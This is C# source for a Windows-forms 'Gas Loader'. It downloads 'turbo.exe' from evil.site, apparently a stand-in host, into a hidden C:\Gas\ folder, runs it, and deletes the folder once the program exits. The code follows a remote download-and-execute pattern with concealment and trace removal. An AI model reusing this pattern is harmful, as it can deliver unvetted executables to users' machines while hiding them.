using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.IO;

namespace Loader
{

    public partial class Form2 : MetroFramework.Forms.MetroForm
    {  
        // hardcoded credentials, please dont kill me
        string auth_username = "";
        string auth_password = "";

        public Form2(string userName)
        {
            InitializeComponent();
            currentUser.Text = userName;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            // https authentication
            WebClient client = new WebClient();

            string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes(auth_username + ":" + auth_password));
            client.Headers[HttpRequestHeader.UserAgent] = "Gas Loader";
            client.Headers[HttpRequestHeader.Authorization] = string.Format("Basic {0}", credentials);
            

            string gasVersion = client.DownloadString("https://evil.site/files/loader/status.txt");
            if (gasVersion.Contains("down"))
            {
                MessageBox.Show("Server is currently undergoing maintainence.", "Error!");
            }

            client.Headers[HttpRequestHeader.UserAgent] = "Gas Loader";
            string currentVersion = client.DownloadString("https://evil.site/files/loader/version.txt");
            versionLabel.Text = currentVersion;

            // default download stable version
            stableRadio.Checked = true;

            // set status to online once authenticated
            statusLabel.Text = "Idle";
            
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            // https authentication
            WebClient client = new WebClient();

            string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes(auth_username + ":" + auth_password));
            client.Headers[HttpRequestHeader.UserAgent] = "Gas Loader";
            client.Headers[HttpRequestHeader.Authorization] = string.Format("Basic {0}", credentials);

            // change status of the button so that
            statusLabel.Text = "Fetching";

            string downloadDirectory = "C:\\Gas\\";

            

            if (System.IO.Directory.Exists(downloadDirectory))
            {
                System.IO.Directory.Delete(downloadDirectory, true);
                Thread.Sleep(2500);

                // before creating the directory, set it to be hidden
                System.IO.Directory.CreateDirectory(downloadDirectory);
                File.SetAttributes(downloadDirectory, FileAttributes.Hidden);

            }
            else
            {
                System.IO.Directory.CreateDirectory(downloadDirectory);
                File.SetAttributes(downloadDirectory, FileAttributes.Hidden);
            }

            // stable version
            if(stableRadio.Checked == true)
            {
                client.Headers[HttpRequestHeader.UserAgent] = "Gas Loader";
                client.DownloadFile("https://evil.site/files/builds/stable/turbo.exe", downloadDirectory + "turbo.exe");
            }

            else if(devRadio.Checked == true)
            {
                client.Headers[HttpRequestHeader.UserAgent] = "Gas Loader";
                client.DownloadFile("https://evil.site/files/builds/dev/turbo.exe", downloadDirectory + "turbo.exe");
            }

            // Check to see if the process is still running
            Process launchedTurbo;
            bool launched;

            launchedTurbo = Process.Start(downloadDirectory + "turbo.exe");

            // hide form once the turbo has started
            this.Hide();

            launched = true;
            while (launched == true)
            {
                if (!launchedTurbo.HasExited)
                {
                    launchedTurbo.WaitForExit();
                }
                else
                {
                    launched = false;
                    if (launched == false)
                    {
                        // Finally end the program
                        MessageBox.Show("Turbo Closed, Thanks for using.", "Goodbye");
                        System.Windows.Forms.Application.Exit();
                        if (System.IO.Directory.Exists(downloadDirectory))
                        {
                            System.IO.Directory.Delete(downloadDirectory, true);
                        }
                    }
                }
            }
            System.Windows.Forms.Application.Exit();
        }
    }
}
